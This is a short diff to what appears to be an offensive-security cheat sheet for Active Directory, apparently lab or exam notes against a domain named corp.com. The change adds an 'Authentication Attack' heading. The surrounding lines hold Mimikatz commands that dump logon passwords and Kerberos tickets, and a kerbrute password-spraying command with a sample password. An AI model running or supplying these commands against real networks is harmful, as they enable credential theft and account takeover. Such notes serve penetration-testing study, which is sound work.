@@ -59,7 +59,7 @@ sekurlsa::logonpasswords
 dir \\web04.corp.com\backup
 sekurlsa::tickets                         # Group 0 - Ticket Granting Service and Group 2 - Ticket Granting Ticket
 ```
-
+## Authentication Attack
 ### Password Spraying from Windows 
 ```
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
